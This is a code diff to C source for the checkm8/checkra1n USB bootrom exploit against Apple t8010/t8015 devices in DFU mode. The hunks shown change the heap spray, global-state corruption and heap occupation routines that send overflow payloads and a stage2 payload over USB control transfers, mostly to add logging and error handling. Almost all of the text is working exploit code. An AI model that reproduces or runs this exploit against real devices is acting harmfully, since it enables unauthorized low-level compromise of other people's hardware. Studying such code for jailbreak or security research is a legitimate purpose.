@@ -5,58 +5,47 @@
 static unsigned char blank[2048]; // 00000000...
 static unsigned char AAAA[2048];  // 41414141...
 
-// log
-static int empty(void){
-    return 0;
-}
-
-#ifdef HAVE_DEBUG
-#define DEBUG_(...) printf(__VA_ARGS__)
-#else
-#define DEBUG_(...) empty()
-#endif
-
 static void heap_spray(io_client_t client){
-    IOReturn r;
-    r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
+    transfer_t result;
+    UInt32 wLen;
+    
+    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     usleep(1000);
     
-#ifndef IPHONEOS_ARM
-    r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
-    
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
-    DEBUG_("%x\n", r); // kIOUSBTransactionTimeout
-#else
     // For iOS devices (especially older ones)
     // Repeat forever until usb_ctrl_transfer(0x80,6,0x304,0x40a,blank,64) reaches Timeout
     for(int i=0;i<16384;i++){
-        r = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
-        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
-        if(r != 0) break;
+        wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
+        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+        if(result.ret != kIOReturnSuccess) break;
     }
-    DEBUG_("%x\n", r);
-#endif
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
     for(int i=0;i<64;i++){
-        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
+        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
     }
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
     for(int i=0;i<16;i++){
-        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
+        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
     }
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
-    
+    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
 }
 
 static void set_global_state(io_client_t client){
-    IOReturn r;
+    transfer_t result;
     unsigned int val;
-    unsigned int sent;
+    UInt32 sent;
     
     val = 1408; // t8010 & t8015 & s5l8960x
     
@@ -69,44 +58,51 @@ static void set_global_state(io_client_t client){
     int i=0;
     while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) >= val){
         i++;
-        DEBUG_("%x\n", i);
+        DEBUG_LOG("[%s] retry: %x\n", __FUNCTION__, i);
         usleep(10000);
-        r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
+        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
+        DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
         usleep(10000);
     }
     
     val += 0x40;
     val -= sent;
     
-    DEBUG_("sent: %x\n", sent);
-    DEBUG_("newval: %x\n", val);
+    DEBUG_LOG("[%s] sent: %x\n", __FUNCTION__, sent);
+    DEBUG_LOG("[%s] val: %x\n", __FUNCTION__, val);
     
-    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
+    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
-    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
-    
+    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
 }
 
 static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
-    IOReturn r;
+    transfer_t result;
     
-    r = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
+    result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     usleep(100000);
     
     for(int i=0;i<16;i++){
         //r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 0);
-        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
     }
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     usleep(10000);
     
-    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
+    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
-    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, AAAA, 512, 100);
+    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, AAAA, 512, 100);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
-    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
-        
-    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
+    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
+    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
 }
 
 int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
@@ -117,61 +113,67 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
     
     LOG_EXPLOIT_NAME("checkm8");
     
-    LOG_DEBUG("reconnect");
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_reset(client);
     io_close(client);
     client = NULL;
     usleep(10000);
     get_device_time_stage(&client, 5, DEVICE_DFU);
     if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
+        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    LOG_DEBUG("[checkra1n] running heap_spray()");
+    LOG_PROGRESS("[%s] running heap_spray()", __FUNCTION__);
     heap_spray(client);
     
-    LOG_DEBUG("reconnect");
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_reset(client);
     io_close(client);
     client = NULL;
     usleep(10000);
     get_device_time_stage(&client, 5, DEVICE_DFU);
     if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
+        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    LOG_DEBUG("[checkra1n] running set_global_state()");
+    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
     set_global_state(client);
     
-    LOG_DEBUG("reconnect");
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_close(client);
     client = NULL;
     usleep(10000);
     get_device_time_stage(&client, 5, DEVICE_DFU);
     if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
+        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    LOG_DEBUG("[checkra1n] running heap_occupation()");
+    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
     heap_occupation(client, cpid, payload);
     
-    LOG_DEBUG("reconnect");
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_close(client);
     client = NULL;
     usleep(10000);
     get_device_time_stage(&client, 5, DEVICE_DFU);
     if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
+        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    LOG_DEBUG("[checkra1n] sending stage2 payload");
-    payload_stage2(client, cpid, payload);
+    LOG_PROGRESS("[%s] sending stage2 payload", __FUNCTION__);
+    r = payload_stage2(client, cpid, payload);
+    if(r != 0){
+        return -1;
+    }
     
-    connect_to_stage2(client, cpid, payload);
+    r = connect_to_stage2(client, cpid, payload);
+    if(r != 0){
+        return -1;
+    }
     
     return 0;
 }
